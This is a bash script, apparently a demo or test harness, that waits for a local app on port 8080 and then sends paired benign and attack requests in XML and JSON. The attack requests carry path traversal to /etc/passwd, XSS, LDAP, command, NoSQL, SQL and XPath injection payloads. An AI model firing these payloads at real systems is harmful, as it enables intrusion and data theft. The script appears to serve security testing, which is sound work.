#!/bin/bash
NONE='\033[00m'
GREEN='\033[01;32m'
RED='\033[01;31m'
BLUE='\033[0;34m'

for ((i=1;i<=30;i++));
do
   response=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/)
   if [[ $response -eq 200 ]]; then
     echo  -e "${BLUE}Application started ${NONE} \n"
     break
   fi
   echo -e "${BLUE}Waiting for Application to start...${NONE}"
   sleep 10
done

echo -e "${GREEN}Step 3: LAUNCHING THE ATTACK! ${NONE}"
echo -e "${GREEN}Firing curl request to execute attack ${NONE}"


if [[ ( $1 == "all" ) ]]; then

# application/xml Pass None
curl --location 'localhost:8080/application/xml' \
--header 'Content-Type: application/xml' \
--data '<?xml version="1.0" encoding="UTF-8" ?>
<data>
	<filename>sample.js</filename>
	<script>test</script>
	<username>test</username>
	<url>http://localhost:8080</url>
	<cmd>google.com</cmd>
	<nosqli>{"type":"fairy"}</nosqli>
    <sqli>{"email": "admin", "password": "admin"}</sqli>
	<xpath>{"username": "admin", "password": "xpath"}</xpath>
</data>'

# application/xml attack
curl --location 'localhost:8080/application/xml' \
--header 'Content-Type: application/xml' \
--data '<?xml version="1.0" encoding="UTF-8" ?>
<data>
	<filename>../../etc/passwd</filename>
	<script>%3Cscript%3Ealert(%22Hacked%22)%3C/script%3E</script>
	<username>*)(uid=*</username>
	<url>http://google.com</url>
	<cmd>google.com;ls</cmd>
	<nosqli>{"type":{"$gte":""}}</nosqli>
    <sqli>{"email": "admin'\'' OR '\''1'\''='\''1", "password": "--"}</sqli>
	<xpath>{"username": "'\'' or '\''1'\''='\''1", "password": "'\'' or '\''1'\''='\''1"}</xpath>
</data>'

# text/xml Pass None
curl --location 'localhost:8080/application/xml' \
--header 'Content-Type: text/xml' \
--data '<?xml version="1.0" encoding="UTF-8" ?>
<data>
	<filename>sample.js</filename>
	<script>test</script>
	<username>test</username>
	<url>http://localhost:8080</url>
	<cmd>google.com</cmd>
	<nosqli>{"type":"fairy"}</nosqli>
    <sqli>{"email": "admin", "password": "admin"}</sqli>
	<xpath>{"username": "admin", "password": "xpath"}</xpath>
</data>'

# text/xml attack
curl --location 'localhost:8080/application/xml' \
--header 'Content-Type: text/xml' \
--data '<?xml version="1.0" encoding="UTF-8" ?>
<data>
	<filename>../../etc/passwd</filename>
	<script>%3Cscript%3Ealert(%22Hacked%22)%3C/script%3E</script>
	<username>*)(uid=*</username>
	<url>http://google.com</url>
	<cmd>google.com;ls</cmd>
	<nosqli>{"type":{"$gte":""}}</nosqli>
    <sqli>{"email": "admin'\'' OR '\''1'\''='\''1", "password": "--"}</sqli>
	<xpath>{"username": "'\'' or '\''1'\''='\''1", "password": "'\'' or '\''1'\''='\''1"}</xpath>
</data>'

# application/json attack
curl --location 'localhost:8080/application/json' \
--header 'Content-Type: application/json' \
--data '{
    "data":{
        "filename": "sample.js",
        "script": "test",
		"username": "test",
		"url": "http://google.com",
		"cmd":"google.com",
		"nosqli": {"type":"fairy"},
    	"sqli": {"email": "admin", "password": "admin"},
		"xpath": "{\"username\": \"admin\", \"password\": \"xpath\"}"
    }
}'
fi